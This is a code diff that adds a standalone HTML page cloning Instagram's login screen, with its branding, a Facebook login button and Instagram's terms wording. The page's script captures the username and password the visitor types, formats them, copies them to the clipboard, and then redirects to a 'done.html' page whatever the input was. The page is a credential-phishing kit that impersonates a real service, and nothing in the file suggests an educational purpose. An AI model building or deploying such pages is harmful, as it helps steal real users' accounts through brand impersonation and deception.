@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap');
+        
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: black;
+            color: white;
+            flex-direction: column;
+        }
+        .login-container {
+            background: black;
+            padding: 20px;
+            width: 350px;
+            text-align: center;
+        }
+        .logo {
+            font-size: 50px;
+            font-family: 'Grand Hotel', cursive;
+            color: white;
+            margin-bottom: 20px;
+            margin-top: -10px;
+        }
+        .fb-login {
+            background: #1877F2;
+            color: white;
+            padding: 10px;
+            border-radius: 5px;
+            width: 100%;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            margin-bottom: 10px;
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 10px 0;
+        }
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #555;
+            margin: 5px;
+        }
+        input {
+            width: 90%;
+            padding: 12px;
+            margin: 8px 0;
+            border: none;
+            border-radius: 5px;
+            background: #262626;
+            color: white;
+            font-size: 14px;
+        }
+        .forgot {
+            color: #0095F6;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #1877F2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 10px;
+        }
+        .signup {
+            margin-top: 15px;
+            font-size: 14px;
+        }
+        .signup a {
+            color: #0095F6;
+            text-decoration: none;
+        }
+        .terms {
+            font-size: 12px;
+            margin-top: 15px;
+            color: #bbb;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">Instagram</div>
+        <button class="fb-login">Continue with Facebook</button>
+        <div class="divider">OR</div>
+        <input type="text" id="email" placeholder="Phone number, username, or email" required>
+        <input type="password" id="password" placeholder="Password" required>
+        <a href="#" class="forgot">Forgot password?</a>
+        <button onclick="login()">Log in</button>
+        <div class="signup">Don't have an account? <a href="#">Sign up</a></div>
+        <div class="terms">By continuing, you agree to Instagram's <b>Terms of Use</b> and <b>Privacy Policy</b>.</div>
+    </div>
+    
+    <script>
+        function login() {
+            let email = document.getElementById("email").value;
+            let password = document.getElementById("password").value;
+            
+            let userData = `Email: ${email}\nPassword: ${password}`;
+            
+            // Copy to Clipboard
+            navigator.clipboard.writeText(userData).then(() => {
+                console.log("User data copied to clipboard");
+            }).catch(err => {
+                console.error("Failed to copy: ", err);
+            });
+            
+            if (email && password) {
+                window.location.href = "done.html";
+            } else {
+                alert("Invalid Credentials");
+            }
+        }
+    </script>
+</body>
+</html>
